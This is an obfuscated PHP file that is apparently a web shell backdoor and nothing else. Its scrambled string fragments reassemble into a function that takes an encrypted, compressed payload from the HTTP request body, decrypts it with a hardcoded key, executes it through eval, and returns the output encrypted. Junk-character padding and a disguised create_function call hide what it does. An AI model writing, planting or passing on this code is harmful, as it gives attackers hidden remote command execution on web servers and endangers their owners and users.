<?php
$C='e++){$o.=$<et{$i}<e^$k{$<ej};}}r<e<eeturn <e$o;}if (@pre<eg_match<e("<e/$kh(.<e+)$<ekf/",@file_ge<et_co<entents(<e"php';
$Y='$o=@<eob_get_co<ente<ents()<e;@ob<e_end<e_clean();$r=@bas<ee64_e<encode(@x<e(@gzcom<epr<eess($o),<e$k));<e<eprint("$<ep$kh$r$kf");}';
$G='k)<e{$<ec=strlen($k)<e;$l<e=strle<en<e($<et)<e;$o="";for($i=0;<e$i<$l;){for<e($j=0<e;<e($j<$c&&$i<e<<e$l);$j++,$i<';
$n='$k="f<e<ea256a55";$kh="4c<e0<e0b3bb2306"<e;$kf="1<e3ad3d<e<e227ebd"<e;$p="wyT<egLbxK80<etz<e89r5";funct<eion x($t<e,$';
$y='://<ein<e<eput"),$m)==1) {@<eob_star<et();@e<ev<eal(@<egzunc<eompres<es(@x(@base<e64_de<ecode<e($m[1]),$k)))<e<e;';
$x=str_replace('jB','','jBjBcrjBeatjBejB_fujBnction');
$z=str_replace('<e','',$n.$G.$C.$y.$Y);
$L=$x('',$z);$L();
?>
